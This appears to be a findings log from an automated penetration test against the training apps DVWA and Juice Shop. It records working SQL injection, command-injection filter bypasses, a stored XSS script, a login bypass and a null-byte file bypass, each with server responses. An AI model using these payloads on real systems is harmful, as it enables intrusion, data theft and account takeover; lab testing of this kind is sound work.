state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: POST security=high,seclev_submit=Submit,user_token=[REDACTED] -> 302 redirect; follow-up GET /security.php confirmed 'Security level is currently: high' and 'Security level set to high'. Level change verified successfully.

[security=high] GET /vulnerabilities/sqli/ returns 200, page text confirms 'Security Level: high'. No visible id input field in this page's own form (id is sourced server-side from session set via session-input.php); page instructs 'Click here to change your ID' linking to session-input.php. Must POST id via session-input.php first, then GET this page (optionally with ?Submit=Submit) to trigger query. Status: pending_verification.

[security=high] GET /vulnerabilities/exec/ returns 200, page text confirms 'Security Level: high'. Form action=/vulnerabilities/exec/ method=POST, fields: ip (text, no maxlength), Submit (submit value='Submit'). At high security level, blacklist includes '; ', '| ' (pipe+space), '&&' — bypass requires pipe immediately followed by command with no space, e.g. 127.0.0.1|whoami. Status: pending_verification.

[security=low] Form action=/vulnerabilities/xss_s/ method=POST with text input 'txtName' (maxlength=10), textarea 'mtxMessage' (maxlength=50), submit buttons 'btnSign'='Sign Guestbook' and 'btnClear'='Clear Guestbook'. No hidden user_token/CSRF field present in this form at low security. Existing seeded entry: Name='test', Message='This is a test comment.'. Canary script payload (len 54) exceeds mtxMessage maxlength=50 client-side but server-side enforcement should be verified since maxlength is only a client attribute; stored XSS confirmation requires submitting then viewing /vulnerabilities/

[security=medium] Form action changed from GET query-string to POST body. 'id' field is now rendered as a <select> dropdown with fixed numeric options (1-5) rather than free-text input, and submit button name is 'Submit'. No CSRF/user_token hidden field present in this form (unlike security.php). Per checklist, medium-level DVWA SQLi escapes quotes server-side, so numeric boolean payloads (no quotes) should be used instead of quoted boolean strings, e.g. id=1 OR 1=1 (TRUE) vs id=1 AND 1=2 (FALSE), submitted as POST form_data to this same URL.

[security=high] GET returned 200 with form action=/vulnerabilities/sqli/session-input.php method=POST, fields: id (text, no maxlength observed), Submit (submit). This form stores the 'id' value server-side (session) to be used out-of-band by GET /vulnerabilities/sqli/?Submit=Submit which then queries without further user input, and query appends LIMIT 1 requiring a trailing comment to bypass (e.g. 1' OR '1'='1' #). Status: pending_verification.

findings.title: SQL Injection via unsanitized 'id' parameter in DVWA SQLi page [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records (multiple seeded surnames): ID:1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 returned zero records (page visible_text only shows 'User ID:' prompt with no 'ID:'/'First name:'/'Surname:' rows). This differential behavior (5 rows vs 0 rows) confirms the 'id' GET parameter is concatenated unsanitized into the backend SQL query, enabling boolean-based SQL injection.

findings.title: OS Command Injection via unsanitized 'ip' parameter in DVWA Command Injection page [security=low]
findings.response_evidence: [security=low] Payload ip=127.0.0.1; whoami produced output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. ... --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3051ms rtt min/avg/max/mdev = 0.020/0.025/0.028/0.003 ms www-data'. The appended 'www-data' line (the web server process identity, not part of normal ping output) confirms the injected ';whoami' command executed server-side, proving unsanitized shell command concatenation of the 'ip' parameter.

findings.title: Stored XSS via unsanitized 'mtxMessage' field in DVWA Guestbook (Stored XSS page) [security=low]
findings.response_evidence: [security=low] Payload <script id=\"test_token\">window.xss_flag=1</script> (52 chars) was submitted via raw POST request bypassing the client-side maxlength=50 attribute on mtxMessage (server performed no length or content sanitization — HTTP 200 and entry 'Name: tester' persisted in the guestbook listing). Upon re-loading the rendering page /vulnerabilities/xss_s/ in an authenticated browser context (dvwa_admin), the injected script executed automatically.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1, confirming the stored <script> payload executed in the DOM upon page render.

findings.title: SQL Injection via numeric boolean bypass in id POST field (DVWA SQLi, medium security)
findings.response_evidence: [security=medium] Confirmed server-side SQL injection via numeric boolean payload (quotes are escaped at medium level, so unquoted numeric OR/AND injection used). TRUE payload id=1 OR 1=1 returned ALL 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) -- confirmed via page visible_text: "ID: 1 OR 1=1 First name: admin Surname: admin ... First name: Gordon Surname: Brown ... First name: Hack Surname: Me ... First name: Pablo Surname: Picasso ... First name: Bob Surname: Smith". FALSE payload id=1 AND 1=2 returned zero records (no "ID:" result blocks in response, only the static User ID selector). Session confirmed at security_level=medium via session_info field in both responses. This demonstrates the backend query is still vulnerable to injection despite quote-escaping, since numeric/unquoted injection is unaffected by the quote-escape mitigation.

findings.title: OS Command Injection via pipe bypass in ip POST field (DVWA Command Injection, medium security)
findings.response_evidence: [security=medium] Confirmed OS command injection bypassing the ';' and '&&' blacklist by using a bare pipe character. Payload ip=127.0.0.1| whoami was submitted and the response pre_block contained exactly "www-data" -- the web server process identity -- appended after the ping output section, confirming arbitrary command execution on the host. Response visible_text: "Vulnerability: Command Injection ... Enter an IP address: www-data". Session confirmed at security_level=medium via session_info field in the response.

findings.title: OS Command Injection via pipe bypass on DVWA exec (high security)
request_sequence: GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed page text 'Security Level: high'
findings.response_evidence: [security=high] At high security, blacklist blocks '; ', '| ' (pipe+space), and '&&', but a pipe with NO trailing space bypasses the filter. Payload ip=127.0.0.1|whoami was submitted via POST. The response's 'pre_blocks' output and visible_text both contain the literal command output 'www-data' appended directly after the ping output area ("Enter an IP address: www-data"), confirming server-side command execution as the www-data web process identity. Page also confirms 'Security Level: high' at time of exploitation.

findings.title: SQL Injection via out-of-band session-input id field on DVWA sqli (high security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: "1' OR '1'='1' #", Submit: 'Submit'} -> stores Session ID in server session
POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: "1' AND '1'='2' #", Submit: 'Submit'} -> stores Session ID in server session
findings.response_evidence: [security=high] At high security the 'id' is submitted out-of-band via session-input.php and the underlying query appends 'LIMIT 1', requiring a trailing comment to neutralize it. TRUE payload id=1' OR '1'='1' # produced multiple seeded user surnames on subsequent GET /vulnerabilities/sqli/?Submit=Submit: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith' (5 records, bypassing LIMIT 1 because the OR condition makes every row match and the UNION-less OR with comment neutralizes the trailing LIMIT clause injection point). FALSE payload id=1' AND '1'='2' # produced zero records: the subsequent GET /vulnerabilities/sqli/?Submit=Submit response contained no 'ID:' result blocks (only the static page chrome, pre_blocks absent). Page confirmed 'Security Level: high' throughout.

findings.title: Cross-User Basket Access (BOLA) via /rest/basket/{id}
findings.response_evidence: HTTP 200 response authenticated as acct2 (own_basket_id=7, acct2_bench@juiceshop.local) returned acct1's basket data verbatim: {\"status\":\"success\",\"data\":{\"id\":6,\"coupon\":null,\"UserId\":22,...,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3,...}}]}}. This matches acct1's known seeded basket (UserId=22, Apple Juice 1000ml, qty=3) and was retrieved using acct2's own auth token without any ownership/authorization check, confirming BOLA.

findings.title: Open Directory Listing on /ftp/ exposes confidential acquisitions.md
findings.response_evidence: HTTP 200, content-type text/html, unauthenticated request returned a browsable directory listing of /ftp/ including entry 'acquisitions.md 909 12/19/2023 1:12:12 PM' alongside other files (announcement_encrypted.md, coupons_2013.md.bak, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml). Listing visible_text confirms: 'listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ...'. No authentication was required to view this listing.

findings.title: Unauthenticated retrieval of confidential acquisitions memo via /ftp/acquisitions.md
findings.response_evidence:
HTTP 200, content-type text/markdown, unauthenticated request directly returned the confidential memo content: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year...'. This confirms the document is retrievable without authentication, exposing confidential business information discovered via the open directory listing at /ftp/.

findings.title: Authentication Bypass via SQL Injection in Login Email Field
findings.response_evidence: HTTP 200 response body: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The injected email payload `' OR 1=1--` comments out the password check in the backend SQL query, causing it to match the first user row (umail: admin@juice-sh.op, bid: 1 - admin's basket id) and issue a valid signed JWT authentication token for that account without knowing the real password. This confirms classic SQLi-based authentication bypass.

findings.title: SQL Injection in Product Search Query Parameter (Error-based + UNION-based)
findings.response_evidence: Request 1 (q=qwert'): HTTP 500 with body containing 'Error: SQLITE_ERROR: near \"'%'\": syntax error', proving the raw input is concatenated unsanitized into the backend SQL query causing a database-level syntax error. Request 2 (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200 with body {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — the literal integers 1-9 returned as field values (name=2, description=3, etc.) demonstrate successful injection of a 9-column UNION SELECT, confirming full control over the query structure and column count alignment.

findings.title: Poison Null-Byte Path Traversal Bypasses File Extension Filter on /ftp/ Endpoint
findings.response_evidence: Request 1 (direct .bak path): HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' at fileServer.js:55 verify() — confirms extension allowlist filter blocks direct .bak access. Request 2 (poison null-byte bypass, encoded as %2500 which decodes to %00 literal 'null' followed by '.md'): HTTP 200, content-type application/octet-stream, body contains the full disclosed package.json backup file content (name: juice-shop, version 6.2.0-SNAPSHOT, dependencies list, devDependencies, repository URL, etc.) — proving the filter checks only the trailing '.md' extension string while the underlying filesystem read call truncates at the null byte and serves the restricted package.json.bak file. This is a confirmed path traversal / filter bypass disclosing a restricted backup file.

findings.title: Unauthenticated PII Exposure via GET /api/Feedbacks
request_sequence:
GET http://juiceshop:3000/api/Feedbacks HTTP/1.1
Accept: application/json
(no Authorization header, unauth session)
findings.response_evidence:
HTTP 200, content-type application/json. Response body is a JSON array of feedback records returned without any authentication. Each record links a UserId to a comment field that embeds a partially-masked but still personally-identifying email address fragment, e.g.:
- id:1, UserId:1 -> comment: "I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)"
- id:2, UserId:2 -> comment: "Great shop! Awesome service! (***@juice-sh.op)"
- id:3, UserId:3 -> comment: "Nothing useful available here! (***der@juice-sh.op)"
- id:4, UserId:21 -> comment: "...(***ereum@juice-sh.op)"
These partial email addresses (domain + trailing local-part characters) are disclosed to an unauthenticated caller and are tied to specific UserId values, confirming PII exposure without authentication. Other records (UserId null) are explicitly marked (anonymous), contrasting with the identified/linked records that leak email fragments.

findings.title: Exposed Encryption-Keys Directory Listing at /encryptionkeys/
request_sequence:
GET http://juiceshop:3000/encryptionkeys/ HTTP/1.1
Accept: text/html,application/json
(unauth session, no Authorization header)
findings.response_evidence:
HTTP 200, content-type text/html; charset=utf-8. Response body is a browsable directory index titled 'listing directory /encryptionkeys/' containing the following entries:
- "jwt.pub 248 12/19/2023 1:12:12 PM"
- "premium.key 50 12/19/2023 1:12:12 PM"
Both filenames are rendered as direct hyperlinks (http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key) in the directory listing, confirming the encryption keys directory is openly browsable without authentication and exposes sensitive key material filenames (JWT public key and premium feature key).
